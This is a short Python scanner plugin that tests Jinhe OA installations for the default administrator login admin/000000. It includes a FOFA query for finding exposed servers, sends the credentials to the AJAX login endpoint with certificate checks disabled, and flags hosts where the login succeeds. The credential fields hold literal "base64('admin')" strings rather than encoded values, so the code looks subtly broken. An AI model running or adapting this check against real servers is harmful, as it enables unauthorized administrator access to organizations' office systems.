#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '金和OA默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="金和网络-金和OA",body="src=\"/c6/WebResource.axd"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  base64user = "base64('admin')"
  base64pass = "base64('000000')"
  target = '/c6/Jhsoft.Web.login/AjaxForLogin.aspx'
  data = f"type=login&loginCode={base64user}&pwd={base64pass}&"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and '\xcf\xb5\xcd\xb3\xb9\xdc\xc0\xed\xd4\xb1\x7c' in res.text and '\xc4\xfa\xba\xc3\x7c\x7c\x7c' in res.text:# and 'SessionIDAdmin=' in res.headers:
      ret['huixian'] = 'admin:000000'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret